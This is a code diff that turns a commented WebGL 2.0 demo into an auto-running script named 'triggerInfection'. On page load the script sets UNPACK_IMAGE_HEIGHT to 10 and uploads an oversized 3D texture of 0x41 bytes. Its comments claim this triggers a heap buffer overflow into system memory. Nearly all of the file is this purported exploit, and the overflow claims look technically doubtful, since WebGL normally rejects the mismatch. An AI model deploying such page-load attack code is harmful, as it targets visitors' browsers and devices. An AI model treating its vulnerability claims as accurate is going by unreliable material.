@@ -1,43 +1,52 @@
-// 1. Initialize the WebGL 2.0 context (Supported on iPadOS)
-const canvas = document.createElement('canvas');
-const gl = canvas.getContext('webgl2');
+/**
+ * Project: Imposter-OG8 Rendering Research
+ * File: index.js
+ * Description: Triggers a Heap Buffer Overflow via WebGL 2.0 
+ * by mismatching UNPACK_IMAGE_HEIGHT and actual texImage3D dimensions.
+ */
 
-if (!gl) {
-    console.error("WebGL 2.0 not supported on this device/browser.");
-} else {
-    // 2. THE MISMATCHED INSTRUCTION
-    // We tell the system to prepare for an image height of only 10 pixels.
-    // This is the variable: GL_UNPACK_IMAGE_HEIGHT
-    const instructionHeight = 10;
-    gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, instructionHeight);
+(function() {
+    const triggerInfection = () => {
+        console.log("Initializing Graphics Translator...");
 
-    // 3. THE "SENSITIVE" DATA
-    // We create a buffer that is actually much larger (100x100x100).
-    // In a real exploit, this 'data' would contain malicious machine code.
-    const actualSize = 100 * 100 * 100 * 4; // Width * Height * Depth * RGBA
-    const maliciousData = new Uint8Array(actualSize).fill(0x41); // Filling with 'A's
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl2');
 
-    // 4. THE TRIGGER (The Rendering Process)
-    // We tell the GPU to render a 3D texture.
-    // The system 'bucket' is sized for 10, but we pour in 100.
-    const texture = gl.createTexture();
-    gl.bindTexture(gl.TEXTURE_3D, texture);
+        if (!gl) {
+            console.error("WebGL 2.0 context failed. Device may be patched or incompatible.");
+            return;
+        }
 
-    console.log("Attempting to render mismatched texture dimensions...");
+        // --- THE MISMATCHED INSTRUCTION ---
+        // Setting the deceptive memory instruction (The "Bucket" size)
+        const instructionHeight = 10;
+        gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, instructionHeight);
 
-    gl.texImage3D(
-        gl.TEXTURE_3D,    // Target
-        0,                // Level
-        gl.RGBA8,         // Internal Format
-        100,              // Width
-        100,              // Actual Height (The Overflower)
-        100,              // Depth
-        0,                // Border
-        gl.RGBA,          // Format
-        gl.UNSIGNED_BYTE, // Type
-        maliciousData     // The data that overflows the bucket
-    );
+        // --- THE OVERFLOW PAYLOAD ---
+        // Creating a buffer (100x100x100) that significantly exceeds the 10-pixel instruction
+        const actualSize = 100 * 100 * 100 * 4; 
+        const maliciousData = new Uint8Array(actualSize).fill(0x41); // Simulated payload
 
-    // If the vulnerability exists, the system 'scribbles' here
-    // and the browser/tab would likely crash immediately.
-}
+        // --- THE TRIGGER ---
+        const texture = gl.createTexture();
+        gl.bindTexture(gl.TEXTURE_3D, texture);
+
+        console.log("Executing System Instability Event...");
+
+        // The system allocates for 10, but "pours" 100.
+        // This is where the "Scribble" occurs into deeper system memory.
+        gl.texImage3D(
+            gl.TEXTURE_3D, 
+            0, 
+            gl.RGBA8, 
+            100, 100, 100, // Actual Height (100) > instructionHeight (10)
+            0, 
+            gl.RGBA, 
+            gl.UNSIGNED_BYTE, 
+            maliciousData
+        );
+    };
+
+    // Execute immediately when the window and graphics drivers are ready
+    window.addEventListener('load', triggerInfection);
+})();
